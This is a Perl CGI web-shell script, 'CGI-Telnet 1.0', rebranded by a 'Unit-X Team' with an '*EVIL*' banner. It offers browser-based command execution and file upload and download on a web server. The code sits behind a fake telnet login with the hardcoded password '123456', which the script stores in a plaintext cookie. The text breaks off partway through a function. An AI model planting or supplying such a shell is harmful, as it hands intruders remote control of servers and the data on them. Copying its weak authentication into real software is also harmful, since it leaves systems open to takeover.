#!/usr/bin/perl
#------------------------------------------------------------------------------
# Copyright and Licence
#------------------------------------------------------------------------------
# CGI-Telnet Version 1.0 for NT and Unix : Run Commands on your Web Server
#
# Copyright (C) 2001 Rohitab Batra
# Permission is granted to use, distribute and modify this script so long
# as this copyright notice is left intact. If you make changes to the script
# please document them and inform me. If you would like any changes to be made
# in this script, you can e-mail me.
#
# Author: Rohitab Batra
# Author e-mail: rohitab@rohitab.com
# Author Homepage: http://www.rohitab.com/
# Script Homepage: mailto:UNITX_TEAM@HOTMAIL.COM
# Product Support: http://www.rohitab.com/support/
# Discussion Forum: http://www.rohitab.com/discuss/
# Mailing List: http://www.rohitab.com/mlist/
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Installation
#------------------------------------------------------------------------------
# To install this script
#
# 1. Modify the first line "#!/usr/bin/perl" to point to the correct path on
#    your server. For most servers, you may not need to modify this.
# 2. Change the password in the Configuration section below.
# 3. If you're running the script under Windows NT, set $WinNT = 1 in the
#    Configuration Section below.
# 4. Upload the script to a directory on your server which has permissions to
#    execute CGI scripts. This is usually cgi-bin. Make sure that you upload
#    the script in ASCII mode.
# 5. Change the permission (CHMOD) of the script to 755.
# 6. Open the script in your web browser. If you uploaded the script in
#    cgi-bin, this should be http://www.yourserver.com/cgi-bin/cgitelnet.pl
# 7. Login using the password that you specified in Step 2.
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Configuration: You need to change only $Password and $WinNT. The other
# values should work fine for most systems.
#------------------------------------------------------------------------------
$Password = "123456";		# Change this. You will need to enter this
				# to login.

$WinNT = 0;			# You need to change the value of this to 1 if
				# you're running this script on a Windows NT
				# machine. If you're running it on Unix, you
				# can leave the value as it is.

$NTCmdSep = "&";		# This character is used to seperate 2 commands
				# in a command line on Windows NT.

$UnixCmdSep = ";";		# This character is used to seperate 2 commands
				# in a command line on Unix.

$CommandTimeoutDuration = 10;	# Time in seconds after commands will be killed
				# Don't set this to a very large value. This is
				# useful for commands that may hang or that
				# take very long to execute, like "find /".
				# This is valid only on Unix servers. It is
				# ignored on NT Servers.

$ShowDynamicOutput = 1;		# If this is 1, then data is sent to the
				# browser as soon as it is output, otherwise
				# it is buffered and send when the command
				# completes. This is useful for commands like
				# ping, so that you can see the output as it
				# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");

#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}

	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}

#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodedCurrentDir = $CurrentDir;
	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<title>Unit-X Team</title>
$HtmlMetaHeader
</head>
<body onLoad="document.f.@_.focus()" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#C2BFA5" bordercolor="#000080" align="center">
<b><font color="#000080" size="2">#</font></b></td>
<td bgcolor="#000080"><font face="Verdana" size="2" color="#009900"><b>CGI-Telnet Unit-x Team Connected to $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#C2BFA5"><font face="Verdana" size="2">
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir">Upload File</a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir">Download File</a> |
<a href="$ScriptLocation?a=logout">Disconnect</a> |
<a href="UNITX_TEAM@HOTMAIL.COM">Help</a>
</font></td>
</tr>
</table>
<font color="#009900" size="3">
END
}

#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{
	$Message = q$<pre><font color="#ff0000"> _____  _____  _____          _____        _               _
/  __ \|  __ \|_   _|        |_   _|      | |             | |
| /  \/| |  \/  | |   ______   | |    ___ | | _ __    ___ | |_
| |    | | __   | |  |______|  | |   / _ \| || '_ \  / _ \| __|
| \__/\| |_\ \ _| |_           | |  |  __/| || | | ||  __/| |_
 \____/ \____/ \___/           \_/   \___||_||_| |_| \___| \__| 1.0
                                         
</font><font color="#FF0000">                      ______             </font><font color="#AE8300">� 2003, Unit-X Team</font><font color="#FF0000">
                   .-&quot;      &quot;-.
                  /   UNIT-X   \
                 |              |
                 |,  .-.  .-.  ,|
                 | )(_o/  \o_)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \</font><font color="#009900">_______</font><font color="#FF0000">\</font><font color="#009900">__</font><font color="#FF0000">|*EVIL*|</font><font color="#009900">__</font><font color="#FF0000">/</font><font color="#009900">_______________________
</font><font color="#FF0000"> (_)</font><font color="#009900">@8@8</font><font color="#FF0000">{}</font><font color="#009900">&lt;________</font><font color="#FF0000">|-\MASTER/-|</font><font color="#009900">________________________&gt;</font><font color="#FF0000">
        )_/        \          / 
       (@           `--------`
             </font><font color="#AE8300">W A R N I N G: Private Server</font></pre>
$;
#'
	print <<END;
<code>
Trying $ServerName...<br>
Connected to $ServerName<br>
Escape character is ^]
<code>$Message
END
}

#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;
<code>
<br>login: admin<br>
password:<br>
Login incorrect<br><br>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
login: admin<br>
password:<input type="password" name="p">
<input type="submit" value="Enter">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "</font></body></html>";
}

#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}

#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "<code>Connection closed by foreign host.<br><br></code>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;
	&Pri
